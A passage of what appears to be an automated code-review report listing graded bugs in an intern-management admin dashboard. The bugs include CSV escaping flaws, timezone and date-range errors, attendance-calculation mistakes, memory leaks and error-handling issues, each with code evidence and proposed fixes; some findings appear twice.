**Fix:** Set activeExport at the start of each handler and clear it in a finally block; pass `disabled={!!activeExport}` and show a spinner on the active card.

## [MEDIUM] CSV export never escapes embedded double quotes, so one intern record shifts every column after it
`frontend/src/api/adminApi.js:570` · *export-escaping*

**What's wrong:** All four converters wrap free-text fields in literal quotes via template strings (`"${value}"`) without doubling any quote characters inside the value, and never escape embedded newlines. RFC 4180 requires an inner `"` to be written as `""`. Any intern whose name, institute or field of specialisation contains a double quote corrupts that row.

**Failure:** An intern is registered as `Nimal "Nim" Perera` (or Institute = `Institute of Technology, "IOT" Katubedda`). The generated line becomes `IN2455,"Nimal "Nim" Perera",nimal@...` — Excel closes the quoted field at the second quote, splits the remainder on the interior comma/space, and every subsequent column for that row lands one or more cells to the right, so Email appears under Field of Specialization and Status under Export Date.

**Evidence:**
```
adminApi.js:570 `` `"${intern.traineeName || ""}"` `` (same pattern at :572, :640, :643-644, :800, :803-804, :738-742). No `.replace(/"/g, '""')` anywhere in the file.
```

**Fix:** Add a single helper `const csvCell = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`` and route every field through it.

## [MEDIUM] Export buttons have no in-flight guard — double click fires duplicate heavy reports and duplicate downloads
`frontend/src/pages/AdminDashboard.jsx:736` · *race-condition*

**What's wrong:** None of the four export handlers set or read a pending flag, and no button is disabled while the request is in flight. There is also no visual feedback at all — the `activeExport` / `showExports` state declared at lines 145-146 is never read or written, so the loading UI these were meant to drive was dropped. `getNonSubmissionsWithinAWeek` loads every intern plus every DailyRecord in the window with `.populate("internId")` and runs a full-collection `$group` aggregation, so multi-second latency is normal.

**Failure:** Admin clicks the "Non-Submissions" card. Nothing visibly happens for 4 seconds, so they click again. Both requests complete; two identical CSVs are written to Downloads and two `alert("Success: Weekly non-submissions CSV report with N interns...")` dialogs stack up, while the server runs the full-collection aggregation twice.

**Evidence:**
```
frontend/src/pages/AdminDashboard.jsx:145-146
  const [showExports, setShowExports] = useState(false);
  const [activeExport, setActiveExport] = useState(null);   // declared, never used anywhere in the file
frontend/src/pages/AdminDashboard.jsx:735-738
                <motion.button onClick={handleExportWeeklyNonSubmissionsWithinWeek} ...>   // no `disabled`
```

**Fix:** Use the already-declared `activeExport` state: set it to the export key before the await, clear it in `finally`, and pass `disabled={!!activeExport}` plus a spinner to each button.

## [MEDIUM] Custom / previous-day date range: `YYYY-MM-DD` is parsed as UTC then re-anchored with local `setHours`, shifting the window
`backend/controllers/adminController.js:961` · *date-timezone*

**What's wrong:** `getWeeklyNonSubmissions` does `new Date(startDateParam)` — the ECMAScript date-only form, which is parsed as **UTC midnight** — and then calls `.setHours(0,0,0,0)`, which re-anchors to the **server-local** midnight of whatever local date that UTC instant falls on. The two representations only agree when the server's UTC offset is >= 0. Nothing in the repo pins the timezone (no `process.env.TZ` anywhere; every other date-sensitive module explicitly uses `moment.tz(..., "Asia/Colombo")`), so this is left to the host. This affects both the custom-range export and the "Previous Day" export, which goes to the trouble of computing its date string in Asia/Colombo (AdminDashboard.jsx:317-336) only for the server to reinterpret it in a different zone.

**Failure:** Server deployed with a negative UTC offset (e.g. a US-region container, TZ=America/New_York). Admin picks 2026-08-01 to 2026-08-05. `new Date("2026-08-01")` = 2026-07-31 20:00 local, `.setHours(0,0,0,0)` = 2026-07-31 00:00 local. The report silently covers Jul 31 – Aug 4 instead of Aug 1 – Aug 5, and `weekPeriod` in the success alert reads "Fri Jul 31 2026 to Tue Aug 04 2026" — every intern's Aug 5 activity is ignored and Jul 31 non-submitters are wrongly included.

**Evidence:**
```
backend/controllers/adminController.js:960-964
    if (startDateParam && endDateParam) {
      startDate = new Date(startDateParam);
      startDate.setHours(0, 0, 0, 0);
      endDate = new Date(endDateParam);
      endDate.setHours(23, 59, 59, 999);
Frontend deliberately computes the Colombo date: frontend/src/pages/AdminDashboard.jsx:317-336 `new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Colombo", ... })`
```

**Fix:** Parse the params with the project's existing tz helper: `startDate = moment.tz(startDateParam, "YYYY-MM-DD", "Asia/Colombo").startOf("day").toDate()` and `endDate = moment.tz(endDateParam, "YYYY-MM-DD", "Asia/Colombo").endOf("day").toDate()`.

## [MEDIUM] Non-submission reports match on `createdAt` instead of the authoritative Colombo `date` field
`backend/controllers/adminController.js:1085` · *date-timezone / logic*

**What's wrong:** `createDailyRecord` writes a server-authoritative Colombo day string into `DailyRecord.date` (`const date = getSriLankanDateString()`), and `getDashboardStats` correctly matches on it (`{ date: { $in: checkWindow } }`). Both non-submission endpoints backing the dashboard export buttons instead range-query the raw `createdAt` timestamp against server-local day boundaries, so a log is attributed to whatever server-local day its insert timestamp falls in, not the day it is logged for. On any host that is not exactly Asia/Colombo the two disagree; a UTC host shifts the boundary by 5h30m.

**Failure:** Server runs in UTC (the default for most containers; no TZ is set in this repo). An intern submits their 2026-08-04 log at 05:00 Colombo on Aug 4 — the record is stored with `date: "2026-08-04"` and `createdAt: 2026-08-03T23:30:00Z`. The admin runs the "Previous Day" export for 2026-08-04; the query window is `createdAt >= 2026-08-04T00:00Z`, so the record is missed and the intern is reported to management as having submitted nothing that day.

**Evidence:**
```
backend/controllers/dailyRecordController.js:75  const date = getSriLankanDateString(); // ★ server-authoritative date
backend/controllers/adminController.js:59-63 (stats, correct)  $match: { date: { $in: checkWindow } }
backend/controllers/adminController.js:1085-1089 (weekly, wrong)
    const weeklyRecords = await DailyRecord.find({ createdAt: { $gte: startDate, $lte: endDate } })
backend/controllers/adminController.js:756-760 (within-week, wrong) same pattern
```

**Fix:** Build the list of Colombo `YYYY-MM-DD` strings for the range and query `{ date: { $in: dayStrings } }` (or `{ date: { $gte: startStr, $lte: endStr } }` since the field is a lexicographically-sortable string).

## [MEDIUM] Corrupt `adminInfo` in localStorage produces an unrecoverable error screen with no way to log out
`frontend/src/pages/AdminDashboard.jsx:154` · *crash / error-handling*

**What's wrong:** `JSON.parse(localStorage.getItem("adminInfo") || "{}")` is unguarded (as is `getAuthToken` in adminApi.js:25-29). If the stored value is not valid JSON the parse throws, and the catch produces the generic "Failed to load dashboard data." error. The error branch at line 449 returns *before* `<AdminNavigation>` is rendered, so the page has no navbar, no logout button, and no links — only a "Retry" button wired to `fetchData`, which re-parses the same corrupt value and fails identically forever. `AdminRoute` still lets the user in because `getAdminSession()` catches its own parse error and returns `null`... which would redirect — but a *partially* valid value (e.g. `{"token":"x","user":{"role":"admin"}` truncated) is exactly the case that reaches here.

**Failure:** A quota-exceeded write or an aborted login truncates `adminInfo` to invalid JSON. The admin opens /admin/dashboard and sees a red warning card reading "Failed to load dashboard data. Please try again." with a Retry button. Retry fails identically every time, and because `AdminNavigation` is not rendered there is no logout control and no other admin link — the user is stuck until they manually clear site data.

**Evidence:**
```
frontend/src/pages/AdminDashboard.jsx:154  const adminInfo = JSON.parse(localStorage.getItem("adminInfo") || "{}");
frontend/src/api/adminApi.js:25-29
  const adminInfo = localStorage.getItem("adminInfo");
  if (adminInfo) { const parsed = JSON.parse(adminInfo); return parsed.token; }   // no try/catch
frontend/src/pages/AdminDashboard.jsx:449-466  if (error) { return (<div className="admin-dash-loader">...</div>); }   // rendered outside <AdminNavigation>
```

**Fix:** Use the existing `getAdminSession()` helper (which already try/catches) in both places, and render the error card inside `<AdminNavigation>` so logout/navigation remain reachable.

## [MEDIUM] CSV export does not escape embedded double quotes or newlines — a single quote in a name breaks every column after it
`frontend/src/api/adminApi.js:839` · *export / escaping*

**What's wrong:** All CSV converters wrap free-text fields in literal quotes via template strings (`` `"${intern.traineeName || ""}"` ``) without doubling embedded `"` per RFC 4180, and without handling embedded newlines. `traineeId` and `email` are emitted completely unquoted (line 840-841). Any `"` inside `Trainee_Name`, `field_of_spec_name`, or `Institute` — all free-text strings synced from the external SLT API — terminates the quoted field early and shifts every subsequent column. The same pattern exists in `convertToCSV` (line 609/611) used by the "Submissions" export and in `convertOverdueInternsToCSV` (line 777-784).

**Failure:** An intern's institute is recorded as `University of Colombo "UCSC"`. The row emits `...,"University of Colombo "UCSC"",...` — Excel parses this as `University of Colombo UCSC"` merged with the next field, so Training Start Date, Training End Date, Logs Submitted, and Last Submission Date all shift one column left for that row. The recipient reads the wrong last-submission date for that intern.

**Evidence:**
```
frontend/src/api/adminApi.js:836-848
      ...sortedInterns.map((intern, idx) => {
        return [
          idx + 1,
          `"${intern.traineeName || ""}"`,
          intern.traineeId || "",
          intern.email || "",
          `"${intern.fieldOfSpecialization || ""}"`,
          `"${intern.institute || "Not Specified"}"`,
          ...
        ].join(",");
```

**Fix:** Add one shared helper `const csvCell = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;` and route every field in all four converters through it (this also neutralises `=`/`+`/`-`/`@` formula-injection when combined with a leading-apostrophe guard).

## [MEDIUM] `getInternReport` (Submissions export fallback) ignores test accounts and uses a different overdue rule than the KPI cards
`backend/controllers/adminController.js:198` · *logic / data-consistency*

**What's wrong:** The "Submissions" export falls back to GET /admin/report/interns, which loads `Intern.find({})` — every document ever synced, including `isTestAccount: true` records and interns whose training ended months ago — and derives `isOverdue` as "never submitted, or last submission older than 5 working days ago" using a hand-rolled loop that ignores Sri Lankan public holidays. The dashboard's "Submitted" KPI on the same screen uses `getActiveInternsQuery()` plus "at least 3 logs among `getPastWorkingDays(5)`". Since the frontend defines a submitted intern as `!isOverdue && totalRecords > 0`, the exported row count cannot match the KPI.

**Failure:** The "Submitted" KPI card reads 118. The admin clears the search box and clicks "Submissions"; the alert reads "Submitted interns CSV report with 402 interns downloaded successfully" because the export counted every historical and test intern who ever submitted a log within 5 weekdays of their last active day. The two numbers on the same screen contradict each other by 3x.

**Evidence:**
```
backend/controllers/adminController.js:198  const interns = await Intern.find({}).lean();   // no getActiveInternsQuery()
backend/controllers/adminController.js:186-195  while (workingDaysCount < 5) { ... if (dayOfWeek !== 0 && dayOfWeek !== 6) workingDaysCount++; }   // no holiday exclusion
backend/controllers/adminController.js:246-248  const isOverdue = !isWithinGracePeriod && (!lastSubmission || new Date(lastSubmission) < fiveWorkingDaysAgo);
Frontend filter: frontend/src/pages/AdminDashboard.jsx:222-224  allInterns.filter((intern) => !intern.isOverdue && intern.totalRecords > 0)
```

**Fix:** Use `Intern.find(getActiveInternsQuery()).lean()` and compute `isOverdue` from `getPastWorkingDays(5)` + `MIN_WEEKLY_LOGS_REQUIRED` matched against `DailyRecord.date`, matching `getDashboardStats`.

## [LOW] Object URL leaked on every CSV download
`frontend/src/api/adminApi.js:668` · *memory-leak*

**What's wrong:** csvUtils.downloadCSV creates an object URL for the blob and removes the anchor, but never calls URL.revokeObjectURL. The blob is pinned in memory for the lifetime of the document. The sibling Excel download in the page does this correctly (AdminDashboard.jsx:264 calls window.URL.revokeObjectURL(url)), so the omission is clearly unintentional.

**Failure:** An admin session where the operator exports the current-week, previous-day and several custom-range reports (each a few hundred KB of CSV) accumulates every blob in the tab's memory until the page is reloaded; nothing is ever released.

**Evidence:**
```
adminApi.js:663-676 `const url = URL.createObjectURL(blob); link.setAttribute("href", url); ... link.click(); document.body.removeChild(link);` — no revokeObjectURL. Compare AdminDashboard.jsx:257-264 which does `window.URL.revokeObjectURL(url);`.
```

**Fix:** Call URL.revokeObjectURL(url) after link.click() (wrapped in a setTimeout(…, 0) if a browser needs the URL to survive the click).

## [LOW] Leave Requests picker modal is unreachable — nothing ever opens it
`frontend/src/pages/AdminDashboard.jsx:809` · *dead-ui*

**What's wrong:** showLeaveRequestPicker is initialised to false and setShowLeaveRequestPicker is only ever called with `false` (lines 816, 837, 849, 870). No button, card or menu item in the file sets it to true, so the 80-line modal offering "Short Leave Request Management" and "Extended Leave Requests Management" can never render. The two navigation targets it exposes are consequently not reachable from the dashboard at all.

**Failure:** An admin looking for leave-request approvals on the dashboard finds no entry point; the feature that the code was written to surface (/admin/leave-requests and /admin/study-leave-requests) is simply invisible on this page even though both routes exist in AppRoutes.jsx:158-165.

**Evidence:**
```
AdminDashboard.jsx:147 `const [showLeaveRequestPicker, setShowLeaveRequestPicker] = useState(false);` — grep for setShowLeaveRequestPicker returns only :816, :837, :849, :870, all `(false)`. Modal guarded by :810 `{showLeaveRequestPicker && (`.
```

**Fix:** Either add the missing trigger (e.g. a "Leave Requests" card in the Reports & Exports grid calling setShowLeaveRequestPicker(true)) or delete the dead modal and its state.

## [LOW] Error state replaces the whole page including the admin navigation, stranding the user
`frontend/src/pages/AdminDashboard.jsx:449` · *error-handling*

**What's wrong:** The `if (error) return (...)` early return renders a bare card outside the <AdminNavigation> wrapper used by the normal render path, so when the dashboard stats call fails with anything other than 401/403 the admin loses every navigation control and is left with a single Retry button.

**Failure:** GET /api/admin/dashboard/stats returns 500 (e.g. the DailyRecord aggregation times out). The admin sees only "Failed to load dashboard data. Please try again." and a Retry button on an otherwise empty page. Retry hits the same failing endpoint, and there is no sidebar/navbar link to reach /admin/daily-records or any other admin page — the only escape is typing a URL manually.

**Evidence:**
```
AdminDashboard.jsx:449-466 `if (error) { return (<div className="admin-dash-loader"><div className="admin-dash-error-card"> ... <button onClick={fetchData} ...>Retry</button></div></div>); }` — compare the success path at :471-472 which wraps everything in `<AdminNavigation>`.
```

**Fix:** Render the error card inside <AdminNavigation> so the admin keeps the nav, and treat the stats failure as a card-level error rather than a page-level one.

## [LOW] CSV download object URL is created but never revoked
`frontend/src/api/adminApi.js:707` · *memory-leak*

**What's wrong:** `csvUtils.downloadCSV` calls `URL.createObjectURL(blob)` and never calls `URL.revokeObjectURL(url)`, so the blob is pinned in memory for the lifetime of the document. Note that `handleDownloadOnLeaveExcel` in AdminDashboard.jsx:264 does this correctly, which makes the omission here clearly unintentional rather than deliberate.

**Failure:** An admin repeatedly exports the weekly non-submissions CSV (each ~200 KB for 400 interns) while triaging, say 30 times in one session without reloading. All 30 blobs stay resident; the tab's memory grows monotonically and none of it is reclaimable until a full page reload.

**Evidence:**
```
frontend/src/api/adminApi.js:702-715
  downloadCSV: (csvContent, filename = "intern_report.csv") => {
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    ...
      const url = URL.createObjectURL(blob);
      ...
      link.click();
      document.body.removeChild(link);   // no URL.revokeObjectURL(url)
    }
Compare frontend/src/pages/AdminDashboard.jsx:264  window.URL.revokeObjectURL(url);
```

**Fix:** Add `URL.revokeObjectURL(url);` after `document.body.removeChild(link);` (or inside a `setTimeout(..., 0)` for older Safari).

## [LOW] Within-week report checks 6 working days but reports and labels it as 5
`backend/controllers/adminController.js:748` · *logic / off-by-one*

**What's wrong:** The window loop starts at `currentDate = today` and decrements *before* testing, so the 5 counted weekdays are all strictly before today. `getWorkingDays(startDate, today)` is then called with `today` as the inclusive upper bound, so when today is a weekday the resulting `workingDays` array has 6 entries — including the current day, for which logs are not yet due. The response nevertheless hard-codes `workingDaysChecked: 5`, and the frontend's empty-result message repeats the claim.

**Failure:** An admin runs the "Non-Submissions" export at 09:30 on a Wednesday. The window silently spans last Wednesday through today (6 weekdays), and today counts toward `applicableWorkingDays.length`, changing each intern's `applicableDaysCount` and `requiredDaysCount` in the response. The API still reports `workingDaysChecked: 5`, and if the list is empty the admin sees "All interns have submitted records within the last 5 working days." — a period that does not match what was actually evaluated.

**Evidence:**
```
backend/controllers/adminController.js:729-741  while (workingDaysCount < 5) { currentDate.setDate(currentDate.getDate() - 1); ... }   // 5 weekdays strictly before today
backend/controllers/adminController.js:748  const workingDays = getWorkingDays(startDate, today);   // inclusive of today -> 6 entries
backend/controllers/adminController.js:927  workingDaysChecked: 5,
frontend/src/pages/AdminDashboard.jsx:286-289  "All interns have submitted records within the last 5 working days."
```

**Fix:** Bound the range at the previous working day (`getWorkingDays(startDate, endOfPreviousWorkingDay)`) and derive `workingDaysChecked` from `workingDays.length` instead of hard-coding 5.

# AdminInternDetails — 16 findings

## [HIGH] Meeting Attendance Rate denominator keeps growing after the internship ends (never capped at endDate)
`frontend/src/pages/AdminInternDetails.jsx:651` · *logic-error*

**What's wrong:** In the Overview "Meeting Attendance Rate" block, `end` is computed from `intern.endDate` (line 646-648) but is then completely ignored: `const measureTo = now;`. The number of "weeks held" is therefore measured from the training start date to *today*, forever. The comment on line 650 even claims "Total weeks across the full internship duration (start date to end date)", which is not what the code does. The Daily Attendance Rate block immediately below does it correctly (line 736: `const measureTo = end && now > end ? end : now;`), so the two bars on the same card use different denominators.

**Failure:** An intern trained 2025-01-01 → 2025-06-30 (26 weeks) and attended the weekly meeting every single week. Opening their profile on 2026-08-04 computes weeksHeld = ceil((2026-08-04 − 2025-01-01)/7) ≈ 83, so the bar renders red at 31% with the caption "26 weeks attended out of 83 weeks so far". A completed intern's meeting attendance score silently decays by ~1.2% every week after they leave.

**Evidence:**
```
const start = new Date(intern.startDate);
const end = intern.endDate ? new Date(intern.endDate) : null;   // computed, never used
const now = new Date();
// Total weeks across the full internship duration (start date to end date)
const measureTo = now;
...
const weeksHeld = Math.max(1, Math.ceil((measureTo - start) / (1000*60*60*24*7)));
const pct = Math.min(100, Math.round((present / weeksHeld) * 100));

// contrast with line 736 in the very next block:
const measureTo = end && now > end ? end : now;
```

**Fix:** Use the same cap as the daily block: `const measureTo = end && now > end ? end : now;` (and drop the now-false comment).

## [HIGH] Attendance calendar marks admin-entered manual daily attendance as "Absent"
`frontend/src/pages/AdminInternDetails.jsx:79` · *logic-error*

**What's wrong:** `getAttendanceMeta` only treats a daily entry as present when `rawType` is exactly `"face"` or `"daily_qr"`. But the backend emits four daily raw types — `face`, `daily_qr`, `manual_daily`, `daily` (backend/controllers/adminInternDetailsController.js:24-29 and backend/utils/attendanceHistory.js DAILY_TYPE_PRIORITY). `manual_daily` is what backend/controllers/manualAttendanceController.js:96 and :198 write when an admin marks daily attendance from the Manual Attendance page. Because that type is not in the whitelist, `isDailyPresent` is false and the day falls through to the red "Absent" badge on line 1757-1761. Worse, the "Daily Present" stat card (line 1299-1303) and the month badge "Daily Present: N" (line 1283-1286) count the same entry as present, so the same screen contradicts itself.

**Failure:** An intern's face scan fails on 2026-07-15 and an admin marks them present via Manual Attendance (stored as `type: "manual_daily"`). On the intern's Attendance tab, 15 July renders a red "Absent" chip in the calendar grid while the header pill says "Daily Present: 1" for that month. An admin reviewing the calendar concludes the intern was absent.

**Evidence:**
```
// AdminInternDetails.jsx:77-79
const isDailyPresent = dailyEntry &&
  (dailyEntry.status || "").toLowerCase() === "present" &&
  (dailyEntry.rawType === "face" || dailyEntry.rawType === "daily_qr");

// backend/controllers/manualAttendanceController.js:96
const type = mode === "daily" ? "manual_daily" : "manual_meeting";

// backend/utils/attendanceHistory.js
const DAILY_TYPE_PRIORITY = { face: 4, daily_qr: 3, manual_daily: 2, daily: 1 };
```

**Fix:** Whitelist all real daily types, e.g. `["face", "daily_qr", "manual_daily"].includes(dailyEntry.rawType)` (and decide explicitly whether logbook-derived `"daily"` counts), so the calendar agrees with the stat cards.

## [MEDIUM] GitHub panel hides successfully-fetched module commits whenever the parent repo errors
`frontend/src/pages/AdminInternDetails.jsx:1147` · *api-contract*

**What's wrong:** The commit panel branches on `proj.error` before it looks at `proj.commits`. On the backend (adminController.js:1836-1854) a project entry aggregates commits from the direct repo *and* from every module/child repo into `entry.commits`, but `entry.error` is set from the direct-project repo result only. So a project whose main repo returns 403 while its module repos returned commits comes back as `{ error: "repository_access_denied", commits: [ ...20 real commits... ] }`, and the UI throws all of them away in favour of an error string.

**Failure:** Project "Portal" has a main repo whose `repoAccessToken` has expired (GitHub 403) plus two module repos that fetch fine with 20 commits. The admin sees only "Unable to fetch commits: repository access denied" under "Portal" and zero commits, even though 20 of the intern's commits were successfully retrieved and are present in the response payload.

**Evidence:**
```
{proj.error ? (
  <p className="text-gray-400 italic">Unable to fetch commits: {proj.error.replace(/_/g, " ")}</p>
) : proj.commits.length === 0 ? ( ... ) : ( ...render commits... )}

// backend/controllers/adminController.js:1846-1853
entry.commits.push(...result.commits);      // modules merged in
...
if (result.error) entry.error = result.error;   // direct-repo error overrides display
```

**Fix:** Render commits whenever `proj.commits.length > 0` and show `proj.error` as a non-blocking warning banner above them instead of an either/or branch.

## [MEDIUM] Attendance calendar paints every past weekday outside the internship window as "Absent"
`frontend/src/pages/AdminInternDetails.jsx:85` · *logic-error*

**What's wrong:** `getAttendanceMeta` only special-cases weekend / holiday / future. Every other day falls through to the default return, and the render at line 1757-1761 shows a red "Absent" chip for any such day with no daily or meeting record. Nothing in the function is aware of `intern.startDate` / `intern.endDate`, so months entirely before the intern joined (or after they finished) are rendered as full months of absences.

**Failure:** An intern started 2026-06-01. The admin opens the Attendance tab and clicks the "previous month" chevron twice to reach April 2026 — every Mon–Fri cell shows a red "Absent" badge for a period when the intern was not even enrolled. Same for any month after `endDate` for a finished intern.

**Evidence:**
```
if (isWeekend) return {...isWeekend: true};
if (holiday)  return {...isHoliday: true};
if (isFuture) return {...isFuture: true};
return { bgClass: "bg-white", textClass: "text-gray-700", hasMeetingAttended, isDailyPresent };

// render, line 1757:
{!attMeta?.hasMeetingAttended && !attMeta?.isDailyPresent && !attMeta?.isWeekend && !attMeta?.isFuture && !attMeta?.isHoliday && (
  <span ...>Absent</span>
)}
```

**Fix:** Pass `intern.startDate` / `intern.endDate` into `getAttendanceMeta` and return an `isOutsideTraining` flag (rendered neutral/greyed) for days before start or after end.

## [MEDIUM] "Daily Absent" stat card can only ever count leave days, never real no-shows
`frontend/src/pages/AdminInternDetails.jsx:1580` · *logic-error*

**What's wrong:** `allDailyTotal` is `attendanceData.dailyAttendance.length` — the number of days for which a record of any kind exists — and `allDailyPresent` counts the present ones. "Daily Absent" is therefore `allDailyTotal - allDailyPresent`, which by construction equals the number of days that produced an entry with status Absent. The backend only ever derives `Absent` from a DailyRecord whose status is `leave`/`study_leave` (adminInternDetailsController.js:243-247); a day with no record at all produces no entry. So the card is structurally incapable of reporting a genuine absence.

**Failure:** An intern never checked in for 40 consecutive weekdays and filed no leave. The "Daily Present" card shows their 12 attended days and the "Daily Absent" card next to it shows 0, so the profile reads as a clean attendance record despite 40 missing days.

**Evidence:**
```
{ count: allDailyTotal - allDailyPresent, total: allDailyTotal, label: "Daily Absent", ... }

const allDailyTotal = (attendanceData?.dailyAttendance || []).length;

// backend/controllers/adminInternDetailsController.js:243-247
const derivedAttendanceStatus =
  recordStatus === "leave" || recordStatus === "study_leave" ? "Absent" : "Present";
```

**Fix:** Compute absences as (expected working days in range, holidays excluded) − (unique present days), the same way the Daily Attendance Rate block does, or relabel the card "Leave Days".

## [MEDIUM] study_leave logbook days render as a green "Submitted" working day
`frontend/src/pages/AdminInternDetails.jsx:111` · *logic-error*

**What's wrong:** `getLogbookMeta` checks only `st === "leave"` for the leave branch. `DailyRecord.status` is an enum of `["working", "leave", "wfh", "study_leave"]` (backend/models/DailyRecord.js), so `study_leave` skips the red branch and falls into the generic green return, where the label ternary (`wfh` → WFH, `working` → Working, else → "Submitted") yields "Submitted" and `isSubmitted: true`. The Records-tab calendar therefore paints study leave as an emerald "Submitted" working day, and it is counted in the "Logs Submitted" tile.

**Failure:** An intern takes 5 days of approved study leave in May; each day has a DailyRecord with status `study_leave`. The Records tab calendar shows 5 green "Submitted" cells and "Logs Submitted: 5" for that week, so an admin auditing presence believes the intern worked those days.

**Evidence:**
```
const st = (rec.status || "").toLowerCase();
if (st === "leave") return { ... label: "On Leave", isLeave: true };
return {
  bgClass: "bg-green-50", textClass: "text-green-700",
  label: st === "wfh" ? "WFH" : st === "working" ? "Working" : "Submitted",
  isWorking: st === "working", isWfh: st === "wfh", isSubmitted: true
};

// backend/models/DailyRecord.js
status: { type: String, enum: ["working", "leave", "wfh", "study_leave"], default: "working" }
```

**Fix:** `if (st === "leave" || st === "study_leave")` — ideally with a distinct "Study Leave" badge, and exclude both from the "Logs Submitted" count.

## [MEDIUM] "Working Days" loop excludes today — off-by-one that can hide a missed log
`frontend/src/pages/AdminInternDetails.jsx:1909` · *date-timezone*

**What's wrong:** `today` is normalized to midnight (line 1898-1899) but `firstRecordDate` keeps the time-of-day baked into `createdAt` (line 1900-1907). The loop cursor `d` therefore always carries that same time-of-day, so the final comparison `d <= today` fails one iteration early and today is never counted. `totalWeekdays` is consistently one working day short, and since `missedDays = Math.max(0, totalWeekdays - totalRecords)` the shortfall is absorbed into the missed-log count.

**Failure:** An intern's first log was created 2026-07-01 at 10:00 and today is Monday 2026-08-04. The loop's last counted date is 2026-08-03, so "Working Days" shows 24 instead of 25. If the intern has submitted 24 logs but missed one earlier day, "Logs Missed" shows 0 instead of 1 and the gap is invisible.

**Evidence:**
```
const today = new Date();
today.setHours(0, 0, 0, 0);
const firstRecordDate = totalRecords > 0
  ? new Date(internDetails.records[internDetails.records.length - 1].createdAt)  // keeps HH:MM:SS
  : today;
let totalWeekdays = 0;
for (let d = new Date(firstRecordDate); d <= today; d.setDate(d.getDate() + 1)) {
  if (d.getDay() !== 0 && d.getDay() !== 6) totalWeekdays++;
}
```

**Fix:** Normalize the cursor: `const d = new Date(firstRecordDate); d.setHours(0,0,0,0);` before the loop.

## [MEDIUM] Daily Attendance Rate counts public holidays as expected working days
`frontend/src/pages/AdminInternDetails.jsx:745` · *logic-error*

**What's wrong:** The `expectedDays` loop counts every Mon–Fri between the start date and the measure-to date and excludes only weekends. `holidays` and `getHolidayForDate` are already loaded in this component (lines 182-214) and the Attendance calendar in the same page does exclude holidays (getAttendanceMeta line 82), so the two views disagree. The caption explicitly says "expected working days", which public holidays are not.

**Failure:** Sri Lanka has ~25 public holidays a year, most on weekdays. An intern on a 6-month internship with a perfect record over 120 weekdays that include 12 public holidays is scored 108/120 = 90% and rendered in purple ("pct >= 50") instead of 100% blue — and the caption reads "108 days attended out of 120 expected working days".

**Evidence:**
```
let expectedDays = 0;
let curDate = new Date(start);
curDate.setHours(0, 0, 0, 0);
const endCap = new Date(measureTo);
endCap.setHours(0, 0, 0, 0);
while (curDate <= endCap) {
  const day = curDate.getDay();
  if (day !== 0 && day !== 6) expectedDays++;   // no holiday check
  curDate.setDate(curDate.getDate() + 1);
}
```

**Fix:** Skip days for which `getHolidayForDate(curDate)` returns a holiday, matching the calendar's own rule.

## [MEDIUM] A 403 (insufficient permission) wipes the admin session and forces re-login
`frontend/src/pages/AdminInternDetails.jsx:301` · *permissions-auth*

**What's wrong:** `fetchInternDetails` treats any thrown error whose message contains "403" as an authentication failure: it deletes `adminInfo` from localStorage and redirects to /admin-login. But 403 from this endpoint means *authorization* failure — `enforceRoutePermission` maps `/intern/...` to the `interns.view` permission (backend/middleware/adminAuth.js:37) and `requirePermission` returns 403 with code `FORBIDDEN`. Per-user permission arrays are supported and editable (backend/controllers/adminUserController.js:139-141 `sanitizePermissions`), so an admin can legitimately exist without `interns.view`. Note also that the "401" branch is dead: `checkAuth` in adminApi.js already intercepts 401 and throws "Your session has expired. Please log in again.", a message that contains no "401".

**Failure:** A supervisor whose custom permission set omits `interns.view` clicks an intern row on the dashboard. The backend returns 403 FORBIDDEN; instead of "You don't have permission to view intern profiles", the app deletes their session and dumps them on the login screen. They log back in, click the same row, and are logged out again — an unexplained loop with no error message.

**Evidence:**
```
} catch (error) {
  console.error("Error fetching intern details:", error);
  setError("Failed to load intern details");
  if (error.message.includes("403") || error.message.includes("401")) {
    localStorage.removeItem("adminInfo");
    navigate("/admin-login");
  }
}

// backend/middleware/adminAuth.js:24 + :37
return res.status(403).json({ message: `Permission required: ${permission}`, code: "FORBIDDEN" });
if (path.startsWith("/intern") ...) return "interns.view";
```

**Fix:** Only clear the session on 401 (already handled by `checkAuth`). For 403, render a "You do not have permission to view this intern" message and keep the session; better still, have `adminApi` surface `response.status`/`code` rather than string-matching the message.

## [MEDIUM] Attendance, git-commit and recent-record state is never reset when :internId changes
`frontend/src/pages/AdminInternDetails.jsx:216` · *react-state*

**What's wrong:** The mount effect depends only on `[internId]`, but `fetchAttendance` (line 247) and `fetchGitCommits` (line 234) both begin with an early return if their state is already populated, and `setRecentRecords` (line 295-297) is only called when the new intern has at least one record. None of `attendanceData`, `gitCommitsData`, `recentRecords` or `certAttendanceCount` is cleared when the route param changes. Because `/admin/intern/:internId` maps to a single component (AppRoutes.jsx:153), React Router keeps the instance mounted across a param-only change, so the guards fire against the *previous* intern's data.

**Failure:** An admin is on /admin/intern/AAA (intern A, 40 attendance days, 60 commits) and the URL changes to /admin/intern/BBB without a full remount (browser history/forward navigation between two profiles, or editing the URL). `fetchInternDetails` refetches and the header now says intern B, but `fetchAttendance` sees `attendanceData` is truthy and returns immediately, `fetchGitCommits` likewise — so intern B's page displays intern A's attendance calendar, attendance percentages, GitHub commits and (if B has no logs) A's "Recent Activity" rows.

**Evidence:**
```
useEffect(() => {
  fetchInternDetails(); fetchAttendance(); fetchGitCommits();
  fetchCertAttendanceCount(); fetchHolidays(new Date().getFullYear());
}, [internId]);

const fetchGitCommits = useCallback(async () => { if (gitCommitsData) return; ... }, [internId, gitCommitsData]);
const fetchAttendance  = useCallback(async () => { if (attendanceData) return; ... }, [internId, attendanceData]);

if (data.records && data.records.length > 0) { setRecentRecords(data.records.slice(0, 5)); }  // never cleared
```

**Fix:** At the top of the `[internId]` effect reset the per-intern state (`setAttendanceData(null); setGitCommitsData(null); setRecentRecords([]); setCertAttendanceCount(null);`), and call `setRecentRecords(data.records?.slice(0,5) ?? [])` unconditionally.

## [LOW] Attendance fetch failure is invisible on the Overview tab (error state set but not rendered)
`frontend/src/pages/AdminInternDetails.jsx:609` · *error-handling*

**What's wrong:** `attendanceError` is only rendered inside the Attendance tab (line 1561-1565). The two attendance rate bars on the Overview tab are gated on `attendanceData && intern.startDate`, so when `getInternAttendance` fails they simply do not render — no message, no retry affordance, no visual gap indicator. `attendanceLoading` is likewise only surfaced in the Attendance tab.

